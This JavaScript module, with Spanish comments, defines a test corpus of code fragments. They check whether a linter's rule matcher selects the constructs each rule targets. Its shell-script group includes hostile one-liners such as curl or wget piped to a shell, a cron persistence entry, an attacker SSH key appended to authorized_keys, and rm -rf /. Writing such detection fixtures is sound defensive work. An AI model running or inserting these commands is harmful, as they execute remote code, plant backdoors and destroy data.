/**
 * Batería de frontera del alcance del emparejador de los linters de lenguaje natural (hoy, jev-lint): el
 * mismo conjunto de fragmentos de código para todos los miembros, agrupado por construcción. Puro: no lanza nada.
 *
 * Qué mide: no si el modelo acierta (sin clave no hay modelo), sino si el emparejador SELECCIONA el código
 * que la regla debe juzgar. Un fragmento que ninguna regla elige no se envía nunca: es un punto ciego que
 * ningún modelo, por bueno que sea, puede arreglar. La verdad de terreno sale de la pregunta de cada regla
 * (`jev-lint rules`): un fragmento es `defect` si es exactamente lo que esa regla pregunta, y `clean` si
 * se le parece pero no es una construcción que deba elegirse. Se reutilizan `outcome` y `summarize` de
 * frontier-review.mjs: «atrapado» significa aquí «el emparejador lo selecciona».
 */

const defect = (id, technique, file, expect, code) => ({ id, technique, file, truth: "defect", expect: [expect], forbid: [], code });
const clean = (id, file, forbid, code) => ({ id, technique: "lookalike-none", file, truth: "clean", expect: [], forbid, code });

/** @type {{id:string, technique:string, file:string, truth:"defect"|"clean", expect:string[], forbid:string[], code:string}[]} */
export const CORPUS = [
  // — funciones: las formas que una regla sobre el nombre de una función debe alcanzar
  defect("fn-declaration", "function-forms", "a.ts", "fn-name-promises", "function getUser(id: string) {\n  return db.find(id);\n}\n"),
  defect("fn-arrow-const", "function-forms", "a.ts", "fn-name-promises", "export const getUser = (id: string) => db.find(id);\n"),
  defect("fn-function-expression", "function-forms", "a.ts", "fn-name-promises", "const getUser = function (id: string) {\n  return db.find(id);\n};\n"),
  defect("fn-async", "function-forms", "a.ts", "fn-name-promises", "export async function getUser(id: string) {\n  return await db.find(id);\n}\n"),
  defect("fn-generator", "function-forms", "a.ts", "fn-name-promises", "function* getItems() {\n  yield 1;\n}\n"),
  defect("fn-export-default", "function-forms", "a.ts", "fn-name-promises", "export default function getUser() {\n  return 1;\n}\n"),
  defect("fn-object-method", "function-forms", "a.ts", "fn-name-promises", "const api = {\n  getUser(id: string) {\n    return db.find(id);\n  },\n};\n"),
  defect("fn-in-javascript", "function-forms", "a.js", "fn-name-promises", "function getUser(id) {\n  return db.find(id);\n}\n"),
  defect("fn-in-tsx", "function-forms", "a.tsx", "fn-name-promises", "export function getButton() {\n  return <button />;\n}\n"),
  defect("fn-nested", "function-forms", "a.ts", "fn-name-promises", "export function outer() {\n  function getUser(id: string) {\n    return db.find(id);\n  }\n  return getUser;\n}\n"),

  // — métodos de clase
  defect("method-instance", "method-forms", "a.ts", "method-name-promises", "class Repo {\n  getUser(id: string) {\n    return this.db.find(id);\n  }\n}\n"),
  defect("method-static", "method-forms", "a.ts", "method-name-promises", "class Repo {\n  static getUser(id: string) {\n    return db.find(id);\n  }\n}\n"),
  defect("method-async", "method-forms", "a.ts", "method-name-promises", "class Repo {\n  async getUser(id: string) {\n    return await this.db.find(id);\n  }\n}\n"),
  defect("method-private-hash", "method-forms", "a.ts", "method-name-promises", "class Repo {\n  #getUser(id: string) {\n    return this.db.find(id);\n  }\n}\n"),
  defect("method-getter", "method-forms", "a.ts", "method-name-promises", "class Repo {\n  get user() {\n    return this.db.find(1);\n  }\n}\n"),

  // — otros lenguajes con la misma regla
  defect("lang-python", "other-languages", "a.py", "fn-name-promises", "def get_user(id):\n    return db.find(id)\n"),
  defect("lang-python-async", "other-languages", "a.py", "fn-name-promises", "async def get_user(id):\n    return await db.find(id)\n"),
  defect("lang-go", "other-languages", "a.go", "fn-name-promises", "package main\n\nfunc GetUser(id int) int {\n\treturn id\n}\n"),
  defect("lang-rust", "other-languages", "a.rs", "fn-name-promises", "fn get_user(id: u32) -> u32 {\n    id\n}\n"),

  // — try/catch
  defect("catch-empty", "catch-blocks", "a.ts", "catch-hides-failure", "function run() {\n  try {\n    work();\n  } catch (e) {}\n}\n"),
  defect("catch-log-only", "catch-blocks", "a.ts", "catch-hides-failure", "function run() {\n  try {\n    work();\n  } catch (e) {\n    console.log(e);\n  }\n}\n"),
  defect("catch-async", "catch-blocks", "a.ts", "catch-hides-failure", "async function run() {\n  try {\n    await work();\n  } catch {\n    return null;\n  }\n}\n"),
  defect("catch-in-javascript", "catch-blocks", "a.js", "catch-hides-failure", "function run() {\n  try {\n    work();\n  } catch (e) {}\n}\n"),
  defect("catch-in-arrow", "catch-blocks", "a.ts", "catch-hides-failure", "const run = () => {\n  try {\n    work();\n  } catch (e) {}\n};\n"),
  defect("catch-in-method", "catch-blocks", "a.ts", "catch-hides-failure", "class A {\n  run() {\n    try {\n      work();\n    } catch (e) {}\n  }\n}\n"),

  // — mensajes de error, registros y tipos
  defect("error-throw-new", "errors-logs-types", "a.ts", "error-message-matches-condition", "function check(x: number) {\n  if (x < 0) throw new Error(\"x must be positive\");\n  return x;\n}\n"),
  defect("error-throw-typeerror", "errors-logs-types", "a.ts", "error-message-matches-condition", "function check(x: unknown) {\n  if (typeof x !== \"string\") throw new TypeError(\"expected a string\");\n  return x;\n}\n"),
  defect("log-logger-error", "errors-logs-types", "a.ts", "log-level-matches-event", "function run() {\n  logger.error(\"started\");\n}\n"),
  defect("log-console-warn", "errors-logs-types", "a.ts", "log-level-matches-event", "function run() {\n  console.warn(\"started\");\n}\n"),
  defect("type-interface", "errors-logs-types", "a.ts", "type-name-describes-shape", "interface UserList {\n  id: string;\n  name: string;\n}\n"),
  defect("type-alias", "errors-logs-types", "a.ts", "type-name-describes-shape", "type UserList = {\n  id: string;\n  name: string;\n};\n"),

  // — comentarios de documentación
  defect("doc-function", "doc-comments", "a.ts", "comment-describes-declaration", "/** Returns null when missing. */\nexport function getCart(id: string): Cart {\n  return carts.get(id)!;\n}\n"),
  defect("doc-arrow", "doc-comments", "a.ts", "comment-describes-declaration", "/** Returns null when missing. */\nexport const getCart = (id: string): Cart => carts.get(id)!;\n"),
  defect("doc-class", "doc-comments", "a.ts", "comment-describes-declaration", "/** A cart that never changes. */\nexport class Cart {\n  items: string[] = [];\n  add(x: string) {\n    this.items.push(x);\n  }\n}\n"),
  defect("doc-interface", "doc-comments", "a.ts", "comment-describes-declaration", "/** A cart with no items. */\nexport interface Cart {\n  items: string[];\n}\n"),

  // — scripts de shell
  defect("sh-curl-pipe", "shell-scripts", "a.sh", "runs-downloaded-code", "#!/bin/sh\ncurl -s https://example.invalid/i.sh | sh\n"),
  defect("sh-wget-pipe-bash", "shell-scripts", "a.sh", "runs-downloaded-code", "#!/bin/sh\nwget -qO- https://example.invalid/i.sh | bash\n"),
  defect("sh-eval-curl", "shell-scripts", "a.sh", "runs-downloaded-code", "#!/bin/sh\neval \"$(curl -s https://example.invalid/i.sh)\"\n"),
  defect("sh-process-substitution", "shell-scripts", "a.sh", "runs-downloaded-code", "#!/bin/bash\nbash <(curl -s https://example.invalid/i.sh)\n"),
  defect("sh-in-bash-extension", "shell-scripts", "a.bash", "runs-downloaded-code", "#!/bin/bash\ncurl -s https://example.invalid/i.sh | bash\n"),
  defect("sh-in-zsh-extension", "shell-scripts", "a.zsh", "runs-downloaded-code", "#!/bin/zsh\ncurl -s https://example.invalid/i.sh | zsh\n"),
  defect("sh-crontab", "shell-scripts", "a.sh", "installs-persistence", "#!/bin/sh\n(crontab -l; echo '* * * * * /tmp/x') | crontab -\n"),
  defect("sh-authorized-keys", "shell-scripts", "a.sh", "opens-a-backdoor", "#!/bin/sh\necho 'ssh-rsa AAAAB3 attacker' >> ~/.ssh/authorized_keys\n"),
  defect("sh-rm-root", "shell-scripts", "a.sh", "destroys-beyond-its-scope", "#!/bin/sh\nrm -rf /\n"),

  // — parecidos que ninguna de esas reglas debe elegir
  clean("none-assignment", "a.ts", ["fn-name-promises", "method-name-promises"], "const getUser = 1;\n"),
  clean("none-call-only", "a.ts", ["fn-name-promises", "method-name-promises"], "getUser(1);\n"),
  clean("none-function-in-string", "a.ts", ["fn-name-promises", "method-name-promises"], "const s = \"function getUser() { return 1; }\";\n"),
  clean("none-function-in-comment", "a.ts", ["fn-name-promises", "method-name-promises"], "// function getUser() { return 1; }\nconst x = 1;\n"),
  clean("none-try-finally", "a.ts", ["catch-hides-failure"], "function run() {\n  try {\n    work();\n  } finally {\n    done();\n  }\n}\n"),
  clean("none-no-comment", "a.ts", ["comment-describes-declaration"], "export const x = 1;\n"),
  clean("none-plain-call-log", "a.ts", ["log-level-matches-event"], "report(\"started\");\n"),
  clean("none-shell-echo", "a.sh", ["runs-downloaded-code", "installs-persistence", "opens-a-backdoor", "destroys-beyond-its-scope"], "#!/bin/sh\necho hello\nls -la\n"),
];

export const TECHNIQUES = [...new Set(CORPUS.map((c) => c.technique))];
